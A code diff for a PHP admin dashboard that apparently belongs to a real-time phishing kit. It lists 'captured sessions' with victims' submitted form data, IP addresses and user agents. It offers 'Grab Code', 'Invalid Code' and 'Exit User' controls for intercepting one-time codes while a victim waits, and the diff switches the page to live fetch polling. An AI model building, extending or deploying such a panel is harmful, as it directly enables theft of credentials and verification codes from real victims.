@@ -2,6 +2,125 @@
 require_once __DIR__ . '/../settings.php';
 require_once __DIR__ . '/../H4Z3/functions.php';
 
+function render_session_list(array $sessions, $presenceTimeout, $currentTime)
+{
+    if (empty($sessions)) {
+        return '';
+    }
+
+    $redirectTarget = htmlspecialchars($_SERVER['SCRIPT_NAME'] ?? '', ENT_QUOTES, 'UTF-8');
+
+    ob_start();
+    foreach ($sessions as $sessionId => $sessionData) {
+        $lastSeenRaw = $sessionData['last_seen'] ?? null;
+        $lastSeenTimestamp = $lastSeenRaw ? strtotime($lastSeenRaw) : false;
+        if ($lastSeenTimestamp === false) {
+            $lastSeenTimestamp = null;
+        }
+
+        $isActive = $lastSeenTimestamp !== null && ($currentTime - $lastSeenTimestamp) <= $presenceTimeout;
+        $badgeClass = $isActive ? 'active' : 'away';
+        $badgeLabel = $isActive ? 'Active' : 'Away';
+        $lastSeenDisplay = $lastSeenRaw ?? 'N/A';
+
+        $entries = $sessionData['entries'] ?? [];
+        $latestEntry = null;
+        if (!empty($entries)) {
+            $latestEntry = $entries[count($entries) - 1];
+        }
+        $latestStep = $latestEntry['step'] ?? null;
+        $normalizedStep = is_string($latestStep) ? strtolower(str_replace('-', '_', $latestStep)) : null;
+        $shouldShowLoadingActions = ($normalizedStep === 'loading');
+        $shouldShowLoadingCodeActions = ($normalizedStep === 'loading_code');
+        ?>
+        <div class="session-card">
+            <div class="session-meta">
+                <div>
+                    <strong>Session:</strong> <?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?><br>
+                    <small>Last updated: <?php echo htmlspecialchars($sessionData['last_updated'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></small><br>
+                    <small>Last seen: <?php echo htmlspecialchars($lastSeenDisplay, ENT_QUOTES, 'UTF-8'); ?></small>
+                </div>
+                <div class="badge <?php echo $badgeClass; ?>">
+                    <?php echo $badgeLabel; ?>
+                </div>
+            </div>
+            <div class="actions">
+                <a class="export-link" href="?export=<?php echo urlencode($sessionId); ?>">Export</a>
+                <form method="post" action="" onsubmit="return confirm('Are you sure you want to delete this session?');">
+                    <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
+                    <input type="hidden" name="action" value="delete">
+                    <button type="submit" class="action-btn danger">Delete</button>
+                </form>
+                <?php if ($shouldShowLoadingActions): ?>
+                    <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to grab the code for this session?');">
+                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
+                        <input type="hidden" name="pending_action" value="code">
+                        <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
+                        <button type="submit" class="action-btn secondary">Grab Code</button>
+                    </form>
+                <?php endif; ?>
+                <?php if ($shouldShowLoadingCodeActions): ?>
+                    <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to mark the code for this session as invalid?');">
+                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
+                        <input type="hidden" name="pending_action" value="invalid_code">
+                        <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
+                        <button type="submit" class="action-btn secondary">Invalid Code</button>
+                    </form>
+                    <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to exit this user from the session?');">
+                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
+                        <input type="hidden" name="pending_action" value="complete">
+                        <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
+                        <button type="submit" class="action-btn secondary">Exit User</button>
+                    </form>
+                <?php endif; ?>
+            </div>
+            <?php if (!empty($sessionData['entries'])): ?>
+                <table>
+                    <thead>
+                        <tr>
+                            <th style="width:20%;">Timestamp</th>
+                            <th style="width:15%;">Step</th>
+                            <th>Payload</th>
+                            <th style="width:20%;">Meta</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                    <?php foreach ($sessionData['entries'] as $entry): ?>
+                        <tr>
+                            <td><?php echo htmlspecialchars($entry['timestamp'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></td>
+                            <td><?php echo htmlspecialchars($entry['step'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></td>
+                            <td class="payload">
+                                <?php foreach (($entry['payload'] ?? []) as $key => $value): ?>
+                                    <div><strong><?php echo htmlspecialchars($key, ENT_QUOTES, 'UTF-8'); ?>:</strong> <?php echo htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8'); ?></div>
+                                <?php endforeach; ?>
+                            </td>
+                            <td class="payload">
+                                <div><strong>IP:</strong> <?php echo htmlspecialchars($entry['meta']['ip'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></div>
+                                <div><strong>User Agent:</strong> <?php echo htmlspecialchars($entry['meta']['user_agent'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></div>
+                            </td>
+                        </tr>
+                    <?php endforeach; ?>
+                    </tbody>
+                </table>
+            <?php endif; ?>
+        </div>
+        <?php
+    }
+
+    return ob_get_clean();
+}
+
+function sort_sessions_by_last_updated(array $sessions)
+{
+    uksort($sessions, function ($a, $b) use ($sessions) {
+        $timeA = $sessions[$a]['last_updated'] ?? '';
+        $timeB = $sessions[$b]['last_updated'] ?? '';
+        return strcmp($timeB, $timeA);
+    });
+
+    return $sessions;
+}
+
 if (!empty($adminSessionName)) {
     session_name($adminSessionName);
 }
@@ -103,13 +222,29 @@ if ($loggedIn && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']
     exit;
 }
 
+$sessions = [];
+if ($loggedIn && isset($_GET['poll']) && $_GET['poll'] === '1') {
+    $store = h4z3_load_session_store();
+    $sessions = $store['sessions'] ?? [];
+    $sessions = sort_sessions_by_last_updated($sessions);
+    $presenceTimeout = 60;
+    $currentTime = time();
+    $html = render_session_list($sessions, $presenceTimeout, $currentTime);
+    header('Content-Type: application/json');
+    echo json_encode([
+        'html' => $html,
+        'hasSessions' => !empty($sessions),
+    ]);
+    exit;
+}
+
 $store = h4z3_load_session_store();
-$sessions = $store['sessions'];
-uksort($sessions, function ($a, $b) use ($sessions) {
-    $timeA = $sessions[$a]['last_updated'] ?? '';
-    $timeB = $sessions[$b]['last_updated'] ?? '';
-    return strcmp($timeB, $timeA);
-});
+$sessions = $store['sessions'] ?? [];
+$sessions = sort_sessions_by_last_updated($sessions);
+$presenceTimeout = 60; // seconds
+$currentTime = time();
+$renderedSessionsHtml = render_session_list($sessions, $presenceTimeout, $currentTime);
+$hasSessions = !empty($sessions);
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -154,114 +289,69 @@ uksort($sessions, function ($a, $b) use ($sessions) {
     <?php if (!empty($controlError)): ?>
         <div class="alert error"><?php echo htmlspecialchars($controlError, ENT_QUOTES, 'UTF-8'); ?></div>
     <?php endif; ?>
-    <?php if (empty($sessions)): ?>
-        <div class="empty-state">No captured sessions available.</div>
-    <?php else: ?>
-        <?php
-        $presenceTimeout = 60; // seconds
-        $currentTime = time();
-        ?>
-        <?php foreach ($sessions as $sessionId => $sessionData): ?>
-            <?php
-                $lastSeenRaw = $sessionData['last_seen'] ?? null;
-                $lastSeenTimestamp = $lastSeenRaw ? strtotime($lastSeenRaw) : false;
-                if ($lastSeenTimestamp === false) {
-                    $lastSeenTimestamp = null;
-                }
-                $isActive = $lastSeenTimestamp !== null && ($currentTime - $lastSeenTimestamp) <= $presenceTimeout;
-                $badgeClass = $isActive ? 'active' : 'away';
-                $badgeLabel = $isActive ? 'Active' : 'Away';
-                $lastSeenDisplay = $lastSeenRaw ?? 'N/A';
-            ?>
-            <div class="session-card">
-                <div class="session-meta">
-                    <div>
-                        <strong>Session:</strong> <?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?><br>
-                        <small>Last updated: <?php echo htmlspecialchars($sessionData['last_updated'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></small><br>
-                        <small>Last seen: <?php echo htmlspecialchars($lastSeenDisplay, ENT_QUOTES, 'UTF-8'); ?></small>
-                    </div>
-                    <div class="badge <?php echo $badgeClass; ?>">
-                        <?php echo $badgeLabel; ?>
-                    </div>
-                </div>
-                <?php
-                    $entries = $sessionData['entries'] ?? [];
-                    $latestEntry = null;
-                    if (!empty($entries)) {
-                        $latestEntry = $entries[count($entries) - 1];
-                    }
-                    $latestStep = $latestEntry['step'] ?? null;
-                    $normalizedStep = is_string($latestStep) ? strtolower(str_replace('-', '_', $latestStep)) : null;
-                    $shouldShowLoadingActions = ($normalizedStep === 'loading');
-                    $shouldShowLoadingCodeActions = ($normalizedStep === 'loading_code');
-                    $redirectTarget = htmlspecialchars($_SERVER['SCRIPT_NAME'], ENT_QUOTES, 'UTF-8');
-                ?>
-                <div class="actions">
-                    <a class="export-link" href="?export=<?php echo urlencode($sessionId); ?>">Export</a>
-                    <form method="post" action="" onsubmit="return confirm('Are you sure you want to delete this session?');">
-                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
-                        <input type="hidden" name="action" value="delete">
-                        <button type="submit" class="action-btn danger">Delete</button>
-                    </form>
-                    <?php if ($shouldShowLoadingActions): ?>
-                        <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to grab the code for this session?');">
-                            <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
-                            <input type="hidden" name="pending_action" value="code">
-                            <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
-                            <button type="submit" class="action-btn secondary">Grab Code</button>
-                        </form>
-                    <?php endif; ?>
-                    <?php if ($shouldShowLoadingCodeActions): ?>
-                        <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to mark the code for this session as invalid?');">
-                            <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
-                            <input type="hidden" name="pending_action" value="invalid_code">
-                            <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
-                            <button type="submit" class="action-btn secondary">Invalid Code</button>
-                        </form>
-                        <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to exit this user from the session?');">
-                            <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
-                            <input type="hidden" name="pending_action" value="complete">
-                            <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
-                            <button type="submit" class="action-btn secondary">Exit User</button>
-                        </form>
-                    <?php endif; ?>
-                </div>
-                <?php if (!empty($sessionData['entries'])): ?>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th style="width:20%;">Timestamp</th>
-                                <th style="width:15%;">Step</th>
-                                <th>Payload</th>
-                                <th style="width:20%;">Meta</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                        <?php foreach ($sessionData['entries'] as $entry): ?>
-                            <tr>
-                                <td><?php echo htmlspecialchars($entry['timestamp'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></td>
-                                <td><?php echo htmlspecialchars($entry['step'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></td>
-                                <td class="payload">
-                                    <?php foreach (($entry['payload'] ?? []) as $key => $value): ?>
-                                        <div><strong><?php echo htmlspecialchars($key, ENT_QUOTES, 'UTF-8'); ?>:</strong> <?php echo htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8'); ?></div>
-                                    <?php endforeach; ?>
-                                </td>
-                                <td class="payload">
-                                    <div><strong>IP:</strong> <?php echo htmlspecialchars($entry['meta']['ip'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></div>
-                                    <div><strong>User Agent:</strong> <?php echo htmlspecialchars($entry['meta']['user_agent'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></div>
-                                </td>
-                            </tr>
-                        <?php endforeach; ?>
-                        </tbody>
-                    </table>
-                <?php endif; ?>
-            </div>
-        <?php endforeach; ?>
-    <?php endif; ?>
+    <div data-session-list>
+        <?php echo $renderedSessionsHtml; ?>
+    </div>
+    <div class="empty-state" data-empty-state<?php if ($hasSessions) { echo ' style="display:none;"'; } ?>>No captured sessions available.</div>
 </main>
 <?php if ($loggedIn): ?>
 <script>
-    setInterval(() => window.location.reload(), 2500);
+(function () {
+    if (!window.fetch) {
+        return;
+    }
+
+    const sessionListEl = document.querySelector('[data-session-list]');
+    const emptyStateEl = document.querySelector('[data-empty-state]');
+
+    if (!sessionListEl || !emptyStateEl) {
+        return;
+    }
+
+    const pollUrl = new URL(window.location.href);
+    pollUrl.searchParams.set('poll', '1');
+
+    let lastHtml = sessionListEl.innerHTML;
+    let hasLoggedError = false;
+
+    async function pollSessions() {
+        try {
+            const response = await fetch(pollUrl.toString(), {
+                credentials: 'same-origin',
+                cache: 'no-store'
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            const data = await response.json();
+            if (typeof data.html === 'string' && data.html !== lastHtml) {
+                sessionListEl.innerHTML = data.html;
+                lastHtml = data.html;
+            }
+
+            if (Object.prototype.hasOwnProperty.call(data, 'hasSessions')) {
+                if (data.hasSessions) {
+                    emptyStateEl.style.display = 'none';
+                } else {
+                    emptyStateEl.style.display = '';
+                }
+            }
+
+            hasLoggedError = false;
+        } catch (error) {
+            if (!hasLoggedError) {
+                console.error('Polling sessions failed:', error);
+                hasLoggedError = true;
+            }
+        } finally {
+            setTimeout(pollSessions, 2500);
+        }
+    }
+
+    pollSessions();
+})();
 </script>
 <?php endif; ?>
 </body>
